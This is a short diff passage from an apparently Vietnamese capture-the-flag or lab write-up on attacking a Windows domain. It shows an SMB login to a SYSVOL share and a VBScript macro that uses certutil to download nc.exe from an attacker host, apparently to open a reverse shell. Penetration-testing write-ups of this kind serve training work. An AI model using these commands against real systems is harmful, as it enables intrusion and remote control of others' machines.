@@ -89,7 +89,8 @@ smbclient \\\\10.10.93.93\\SYSVOL -U Carl.Moore --password='Carl.Moore'
 
 sau khi check thi ta thay co 1 file cho phep tao o dia va truyen file qua lai trong server dan macro 
 vi vay ta co the tao reverse o day
-``` reverse vscript
+
+```
 Set oShell = CreateObject("Wscript.Shell")
 oShell.run "cmd.exe /c mkdir C:\Temp"
 oShell.run "cmd.exe /c certutil -urlcache -f http://10.8.3.170:8888/nc.exe C:\Temp\nc.exe"
